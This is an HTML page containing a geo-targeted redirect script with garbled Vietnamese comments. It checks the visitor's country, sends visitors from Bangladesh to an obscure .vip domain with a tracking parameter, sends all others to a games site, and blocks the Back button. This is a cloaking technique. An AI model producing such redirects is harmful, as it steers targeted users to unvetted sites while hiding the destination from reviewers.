<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* ·∫®n m·ªçi th·ª©, tr√°nh ch·ªõp n·ªôi dung */
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #000; /* ƒë·ªïi #fff n·∫øu th√≠ch n·ªÅn tr·∫Øng */
    }
  </style>
</head>
<body>
  <script>
  (function () {
    // üîó LINK ƒê√É G·∫ÆN S·∫¥N
    const BD_URL    = "https://www.khcyz.vip/?ch=4f80366d81"; // Bangladesh
    const OTHER_URL = "https://poki.com";                      // C√°c n∆∞·ªõc kh√°c

    // ‚è± Th·ªùi gian delay (ms)
    const DELAY = 1000; // 1 gi√¢y (c√≥ th·ªÉ ƒë·ªïi 1500 ho·∫∑c 2000)

    const CACHE_KEY = "geo_redirect_target_v1"; // key l∆∞u trong sessionStorage

    function safeGetCache() {
      try {
        return sessionStorage.getItem(CACHE_KEY);
      } catch (e) {
        return null;
      }
    }

    function safeSetCache(value) {
      try {
        sessionStorage.setItem(CACHE_KEY, value);
      } catch (e) {
        // ignore
      }
    }

    function go(targetFlag) {
      var url = targetFlag === "BD" ? BD_URL : OTHER_URL;

      // D√πng replace ƒë·ªÉ tr√°nh user b·∫•m Back quay v·ªÅ trang check
      setTimeout(function () {
        window.location.replace(url);
      }, DELAY);
    }

    // 1Ô∏è‚É£ N·∫øu ƒë√£ c√≥ cache ‚Üí kh√¥ng g·ªçi API, redirect nhanh h∆°n
    var cached = safeGetCache();
    if (cached === "BD" || cached === "OTHER") {
      go(cached);
      return;
    }

    // 2Ô∏è‚É£ Ch∆∞a c√≥ cache ‚Üí g·ªçi API x√°c ƒë·ªãnh qu·ªëc gia
    fetch("https://ipapi.co/country/")
      .then(function (res) {
        return res.text();
      })
      .then(function (code) {
        code = (code || "").toString().trim().toUpperCase();

        var flag;
        if (code === "BD") {
          flag = "BD";
        } else {
          flag = "OTHER";
        }

        // L∆∞u l·∫°i ƒë·ªÉ l·∫ßn sau kh√¥ng ph·∫£i g·ªçi API n·ªØa
        safeSetCache(flag);
        go(flag);
      })
      .catch(function () {
        // N·∫øu l·ªói API ‚Üí m·∫∑c ƒë·ªãnh coi nh∆∞ OTHER
        safeSetCache("OTHER");
        go("OTHER");
      });
  })();
  </script>
</body>
</html>
